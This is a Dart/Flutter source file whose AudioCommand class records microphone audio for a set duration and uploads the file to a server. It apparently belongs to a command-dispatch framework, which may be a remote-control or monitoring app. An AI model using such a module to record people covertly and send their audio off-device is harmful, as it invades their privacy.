// audio_command.dart
import 'dart:io';
import 'package:flutter_sound/flutter_sound.dart';
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';
import 'i_command.dart'; // Import the ICommand interface
import 'file_transfer.dart';  // Import file transfer logic to upload files

/// AudioCommand: Records audio for a specified duration and uploads it to the server.
class AudioCommand implements ICommand {
  final int durationInSeconds;

  AudioCommand({this.durationInSeconds = 30});

  @override
  Future<void> execute() async {
    print("AudioCommand: Recording audio for $durationInSeconds seconds...");

    // Request permission to record audio
    PermissionStatus permissionStatus = await Permission.microphone.request();
    if (!permissionStatus.isGranted) {
      print('Permission denied. Cannot record audio.');
      return;
    }

    // Initialize audio recorder
    FlutterSoundRecorder recorder = FlutterSoundRecorder();
    await recorder.openRecorder();

    try {
      // Get a temporary directory for storing the audio file
      Directory tempDir = await getTemporaryDirectory();
      String filePath = '${tempDir.path}/audio_${DateTime.now().millisecondsSinceEpoch}.aac';

      // Start recording
      await recorder.startRecorder(toFile: filePath);
      print('Recording started...');
      await Future.delayed(Duration(seconds: durationInSeconds));

      // Stop recording
      String? result = await recorder.stopRecorder();
      print('Recording stopped. File saved at: $result');

      // Upload the recorded file
      if (result != null) {
        File recordedFile = File(result);
        var uploadResponse = await uploadFileToApi(recordedFile);

        if (uploadResponse != null) {
          print('File uploaded successfully: $uploadResponse');
        } else {
          print('Failed to upload the file.');
        }
      }
    } catch (e) {
      print('Error during recording: $e');
    } finally {
      await recorder.closeRecorder();
    }
  }
}
